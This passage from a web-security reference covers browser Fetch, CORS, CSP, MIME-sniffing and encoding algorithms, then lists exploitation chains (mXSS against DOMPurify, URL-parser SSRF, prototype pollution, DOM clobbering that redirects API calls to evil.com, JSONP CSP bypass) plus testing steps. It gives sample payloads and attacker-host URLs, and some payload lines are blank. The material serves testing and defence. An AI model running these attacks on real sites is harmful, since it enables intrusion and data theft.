10. If request's timing allow failed flag is unset, set timing allow passed flag

11. If response is not network error and ANY of the following returns "blocked":
    - Should internalResponse to request be blocked as mixed content?
    - Should internalResponse to request be blocked by Content Security Policy?
    - Should internalResponse to request be blocked due to its MIME type?
    - Should internalResponse to request be blocked due to nosniff?
    → Return network error

12. Return response

Security Note: Step 11 is where CSP, mixed content, MIME type, and nosniff checks happen. If any of these return “blocked”, the response becomes a network error.

9.3 CORS-Preflight Fetch

Algorithm:

1. Let preflight be a new request whose:
   - method is `OPTIONS`
   - URL list is clone of request's URL list
   - initiator, destination, origin, referrer, referrer policy match request
   - mode is "cors"
   - response tainting is "cors"

2. Append (`Accept`, `*/*`) to preflight's header list

3. Append (`Access-Control-Request-Method`, request's method) to preflight's header list

4. Let headers be CORS-unsafe request-header names with request's header list

5. If headers is not empty:
   - Let value be items in headers separated by ","
   - Append (`Access-Control-Request-Headers`, value) to preflight's header list

6. Let response be result of HTTP-network-or-cache fetch with preflight

7. If CORS check for request and response returns success AND response's status is ok status:
   - Extract Access-Control-Allow-Methods
   - Extract Access-Control-Allow-Headers
   - If either is failure, return network error
   - If methods is null and use-CORS-preflight flag is set, set methods to list containing request's method
   - If request's method is not in methods AND method is not CORS-safelisted AND (credentials is "include" OR methods does not contain `*`), return network error
   - For each CORS non-wildcard request-header name not in headerNames, if credentials is "include" or headerNames does not contain `*`, return network error
   - For each unsafeName in CORS-unsafe request-header names, if not in headerNames and (credentials is "include" or headerNames does not contain `*`), return network error
   - Extract max-age from Access-Control-Max-Age
   - If max-age is failure or null, set to 5
   - If max-age > imposed limit, set to limit
   - Cache the preflight result
   - Return response

8. Otherwise, return network error

CORS-Safelisted Methods: GET, HEAD, POST

CORS-Safelisted Request-Headers: Accept, Accept-Language, Content-Language, Content-Type (with specific values)

CORS-Unsafe Request-Header Names: Any header not in the safelisted set

CORS Non-Wildcard Request-Header Names: Authorization

Security Testing Checklist:

  • Check if Access-Control-Allow-Origin: * is used with credentials: include
  • Check if origin is reflected without validation
  • Check for null origin (Origin: null) acceptance
  • Check for subdomain wildcard issues (*.trusted.com accepting evil.trusted.com)
  • Check if preflight cache can be poisoned via Access-Control-Max-Age
  • Check if non-simple requests bypass preflight via method/header manipulation

9.4 Redirect Handling

Algorithm:

1. If response is opaque redirect filtered response:
   - If request's mode is "manual", return response
   - If request's mode is "follow", return network error

2. If response's status is 301, 302, 303, 307, or 308:
   - If request's redirect mode is "error", return network error
   - If request's redirect mode is "manual", return opaque redirect filtered response
   - If request's redirect mode is "follow":
     - If response's status is 301 or 302 AND request's method is NOT GET/HEAD:
       - Set request's method to GET
       - Set request's body to null
     - If response's status is 303 AND request's method is NOT GET/HEAD:
       - Set request's method to GET
       - Set request's body to null
     - If response's status is 307 or 308:
       - If request's body is non-null and not usable, return network error
     - Append response's location URL to request's URL list
     - If request's URL list size > 20, return network error
     - If request's mode is "cors" and location URL includes credentials, return network error
     - If request's origin is not same-origin with location URL's origin, set request's tainting to "cors"
     - If request's response tainting is "opaque" and location URL is not same-origin, return network error
     - Return the result of running main fetch with updated request

Security Impact:

  • 301/302 redirects convert POST to GET (unless 307/308)
  • Redirects can change origin, triggering CORS checks
  • The 20-redirect limit prevents infinite loops
  • Opaque responses cannot follow cross-origin redirects

10. CSP — Exact Violation Algorithms & Bypass Chains

10.1 CSP Integration with Fetch

CSP is enforced at two points in the Fetch algorithm:

Pre-request check (Step 2.4 of Main Fetch):

Should request be blocked by Content Security Policy?
1. Let CSP list be request's policy container's CSP list
2. Let result be "Allowed"
3. For each policy in CSP list:
   - If policy's disposition is "report", skip
   - Let violates be result of "Does request violate policy?"
   - If violates is not "Does Not Violate":
     - Report violation
     - Set result to "Blocked"
4. Return result

Post-request check (Step 11 of Main Fetch):

Should response to request be blocked by Content Security Policy?
1. Let CSP list be request's policy container's CSP list
2. Let result be "Allowed"
3. For each policy in CSP list:
   - For each directive in policy:
     - If directive's post-request check returns "Blocked":
       - Report violation
       - If policy's disposition is "enforce", set result to "Blocked"
4. Return result

10.2 Inline Check Algorithm

For inline scripts, styles, and event handlers:

Should element's inline type behavior be blocked by CSP?
1. Let result be "Allowed"
2. For each policy of element's Document's global object's CSP list:
   - For each directive in policy's directive set:
     - If directive's inline check returns "Allowed", skip to next directive
     - Let directive-name be effective directive for inline checks on type
     - Create violation object
     - Set violation's resource to "inline"
     - Set violation's element to element
     - If directive's value contains "'report-sample'", set sample to first 40 chars of source
     - Report violation
     - If policy's disposition is "enforce", set result to "Blocked"
3. Return result

Types: “script”, “script attribute”, “style”, “style attribute”

10.3 Nonceable Check

To prevent nonce hijacking via dangling markup:

Is element nonceable?
1. If element does not have "nonce" attribute, return "Not Nonceable"
2. If element is script:
   - For each attribute:
     - If attribute's name contains "<script" or "<style" (case-insensitive), return "Not Nonceable"
     - If attribute's value contains "<script" or "<style" (case-insensitive), return "Not Nonceable"
   - If element had duplicate-attribute parse error during tokenization, return "Not Nonceable"
3. Return "Nonceable"

Security Impact: If a script has a duplicate attribute parse error, it is “Not Nonceable” and cannot be matched by nonce-based CSP. This prevents attackers from stealing nonces via dangling markup.

11. MIME Sniffing — Exact Algorithm & XSS

11.1 The Sniffing Algorithm

To determine the computed MIME type of a resource:

1. If supplied MIME type is XML MIME type or HTML MIME type:
   - Computed MIME type = supplied MIME type
   - Abort

2. If supplied MIME type is undefined or essence is "unknown/unknown", "application/unknown", or "*/*":
   - Execute rules for identifying unknown MIME type
   - Abort

3. If no-sniff flag is set:
   - Computed MIME type = supplied MIME type
   - Abort

4. If check-for-apache-bug flag is set:
   - Execute rules for distinguishing text or binary
   - Abort

5. If supplied MIME type is image MIME type supported by UA:
   - Let matched-type be result of image type pattern matching
   - If matched-type is not undefined, computed MIME type = matched-type
   - Abort

6. If supplied MIME type is audio or video MIME type supported by UA:
   - Let matched-type be result of audio/video type pattern matching
   - If matched-type is not undefined, computed MIME type = matched-type
   - Abort

7. Computed MIME type = supplied MIME type

12. Encoding Standard — Detection, BOM & Delimiter Masking

12.1 Encoding Detection

The browser determines document encoding through:

  1. BOM (Byte Order Mark) at start of file
  2. Content-Type header charset parameter
  3. <meta charset="..."> or <meta http-equiv="Content-Type" content="...;charset=...">
  4. Frame ancestor encoding (if in frame)
  5. Heuristic detection (last resort)

BOM Signatures:

  • EF BB BF → UTF-8
  • FE FF → UTF-16BE
  • FF FE → UTF-16LE

Meta Charset Precedence:

  • The <meta> tag must appear within the first 1024 bytes
  • Only the first valid <meta> charset declaration is used
  • If found, it overrides the HTTP header charset

12.2 ASCII-Incompatible Encodings

Encodings where ASCII bytes map to non-ASCII code points:

  • Shift_JIS: 0x82 0x22 → single character (masks the ")
  • GBK/GB18030: Multi-byte sequences can mask delimiters
  • ISO-2022-JP: Stateful encoding, can switch character sets mid-stream
  • UTF-16BE/LE: ASCII characters take 2 bytes

The 2011 Attack: A JSON resource used Shift_JIS. Attacker controlled a field and injected 0x82 0x22:

  • Producer saw: illegal byte sequence (but didn’t reject)
  • Consumer decoded: single U+FFFD (replacement character)
  • The " delimiter was “eaten” by the encoding
  • JSON structure broke, enabling injection

Modern Mitigation: Decoders must output U+FFFD U+0022 (not a single replacement char) when an ASCII delimiter is masked.

12.3 Encoding Override Attacks

Browsers allow users to override page encoding (View → Encoding). If an attacker can:

  1. Inject carefully crafted content into a resource
  2. Trick the user into changing encoding
  3. The reinterpreted content may contain executable scripts

Example:

Content that looks safe in UTF-8 but becomes `<script>` in Shift_JIS

12.4 BOM Sniffing in Non-HTML Contexts

If attacker controls the first bytes of a response (e.g., CSV export, JSONP callback):

EF BB BF <script>alert(1)</script>

The BOM forces UTF-8 interpretation, but the content is still HTML. If the response is rendered in a browser context, it executes.

13. Exploitation Chains — From Theory to CVE

13.1 Chain 1: mXSS via Namespace Confusion

Target: Application using DOMPurify with default config Goal: Execute arbitrary JavaScript

Steps:

  1. Identify that the application does element.innerHTML = DOMPurify.sanitize(input)
  2. Craft payload using MathML namespace confusion:
  3. Submit payload to application
  4. DOMPurify parses in HTML context → inert DOM
  5. DOMPurify serializes → string
  6. Application assigns to innerHTML → second parse
  7. Namespace transitions cause <style> content to be parsed as HTML
  8. <img onerror> executes

Mitigation: Use RETURN_DOM or RETURN_DOM_FRAGMENT to avoid serialize-reparse roundtrip.

13.2 Chain 2: URL Parser Differential → SSRF

Target: Application that validates URLs server-side but uses them in browser contexts Goal: Make server request internal resource

Steps:

  1. Identify URL validation endpoint
  2. Test with backslash payload: 
    https://evil.com\@127.0.0.1/internal
  3. Server-side parser (RFC 3986) extracts host = evil.com → allows
  4. Browser parser (WHATWG) extracts host = 127.0.0.1 → navigates to internal
  5. If application makes server-side request based on browser-provided URL, SSRF occurs

Mitigation: Use the same URL parser on both client and server. Prefer WHATWG URL parser for consistency.

13.3 Chain 3: Prototype Pollution → Sanitizer Bypass

Target: Application using DOMPurify with polluted Object.prototype Goal: Bypass DOMPurify’s nesting depth limit

Steps:

  1. Find prototype pollution vector (e.g., JSON merge, query string parser)
  2. Pollute Object.prototype.__depth = 99999
  3. Submit deeply nested mXSS payload
  4. DOMPurify’s depth check reads config.__depth → gets polluted value
  5. Depth limit effectively disabled
  6. Nesting-based mXSS succeeds

Mitigation: Sanitize uses Object.create(null) for config. Audit all merge/deep-copy functions.

13.4 Chain 4: DOM Clobbering → Config Hijacking

Target: Application reading config from window or document Goal: Redirect API calls to attacker server

Steps:

  1. Identify code pattern: const config = window.config || defaults
  2. Inject HTML with id="config":
  3. window.config is now HTMLAnchorElement
  4. If code accesses config.apiUrl, it’s undefined
  5. If code falls back to config.href, it uses https://evil.com
  6. API calls exfiltrate data to attacker

Mitigation: Don’t read configuration from DOM. Use proper module imports.

13.5 Chain 5: MIME Sniffing → Stored XSS

Target: File upload with weak extension validation Goal: Execute JavaScript in target origin

Steps:

  1. Upload file with .txt extension but HTML content:
  2. Server serves with Content-Type: text/plain
  3. If X-Content-Type-Options: nosniff is missing, browser sniffs
  4. Browser sees <script> in first bytes → sniffs as text/html
  5. File renders as HTML, script executes in upload domain’s origin

Mitigation: Always set correct Content-Type + X-Content-Type-Options: nosniff. Serve untrusted content from separate origin.

13.6 Chain 6: CSP Bypass via JSONP

Steps:

  1. Identify script-src allows https://trusted.com
  2. Find JSONP endpoint on trusted.com: /api/data?callback=foo
  3. Inject:
  4. Response is alert(1)({...}) → executes alert

15. Testing Methodology

15.1 HTML Parser Differential Testing

  1. Identify insertion context: Is the data going into innerHTML, document.write, or server-rendered HTML?
  2. Identify context element: What element receives the sanitized output? <div>, <svg>, <template>, <textarea>?
  3. Test namespace transitions: Inject payloads with <svg>, <math>, <foreignObject> and check if behavior changes based on parent element.
  4. Test foster parenting: Inject content inside <table> and inspect DOM structure. Are elements foster-parented?
  5. Test reparse stability:

15.2 URL Parser Differential Testing

  1. Identify URL validation logic: What parser does the server use? (Python urllib, Java URL, Go net/url, etc.)
  2. Test backslash payloads: evil.com\@trusted.com
  3. Test multiple @ signs: evil.com@trusted.com@actual.com
  4. Test encoded delimiters: %5C, %2F, %00, %40
  5. Test scheme confusion: javascript://, data:, blob:
  6. Test IP obfuscation: decimal, hex, octal, IPv6 mapped
  7. Verify browser behavior: Open DevTools console, test new URL(input)

15.3 Fetch / CORS Testing

  1. Identify CORS policy: What Access-Control-Allow-Origin header is returned?
  2. Test origin reflection: Send Origin: https://evil.com, check if it’s reflected
  3. Test null origin: Origin: null (from sandboxed iframe or data URI)
  4. Test credentials + wildcard: credentials: include with Access-Control-Allow-Origin: *
  5. Test preflight cache: Send preflight, check if subsequent requests skip preflight
  6. Test custom headers: Add non-safelisted headers, verify preflight behavior

15.4 CSP Testing

  1. Identify active CSP: Check response headers and <meta> tags
  2. Test script-src bypasses: JSONP, AngularJS, base tag, strict-dynamic gadgets
  3. Test style-src bypasses: @import injection, style attribute injection
  4. Test img-src bypasses: SVG images with embedded scripts
  5. Test frame-src bypasses: Clickjacking, phishing via allowed frames
  6. Test form-action: Open redirect via form submission
  7. Test base-uri: Base tag hijacking if directive missing

16. Key Takeaways

  1. The browser parser is not your friend. It is error-recovering, context-dependent, and will silently “fix” your perfectly crafted payload into something executable. Every parse error has defined recovery behavior that may create executable DOM nodes.

  2. Namespace matters more than tags. The same element (<style>, <script>) parses completely differently in HTML vs SVG vs MathML context. This is the root of mXSS and the reason why parse → sanitize → serialize → reparse is fundamentally dangerous.

  3. mglyph and malignmark are the keys to MathML mXSS. These two elements are explicitly excluded from the MathML text integration point rule. When inside <mtext>, they force foreign content parsing, creating namespace flips that bypass sanitizers.

  4. Foster parenting breaks structural assumptions. Content inside <table> may end up outside the table in the DOM. Sanitizers that check structural context (“is this script inside a cell?”) will be bypassed.

  5. URL parsing is differential hell. Browsers use WHATWG; most backends use RFC 3986. The backslash (\) is the most reliable differential. The multiple-@ attack is the second most reliable. Always test both.

  6. CSP is not a silver bullet. JSONP endpoints, AngularJS, base tag hijacking, and script gadgets all bypass CSP. strict-dynamic introduces its own bypass class (trusted scripts loading untrusted scripts).

  7. MIME sniffing overrides your headers. Without X-Content-Type-Options: nosniff, a text/plain file starting with <script> becomes executable HTML. This is especially dangerous for file upload features.

  8. Encoding attacks still work in 2026. Legacy encodings (Shift_JIS, GBK, ISO-2022-JP) can mask delimiters and break parser boundaries. BOM sniffing can force reinterpretation of content.

  9. DOM Clobbering + Prototype Pollution = RCE. These two attacks combine to bypass sanitizers, hijack configuration, and redirect API calls. Modern applications are full of window.config patterns that are trivially clobbered.

  10. Test the full pipeline. Sanitizer → Serialization → Reparsing → Script execution. Each transition is a potential mXSS vector. Never trust a sanitizer’s output without re-parsing and inspecting the resulting DOM.
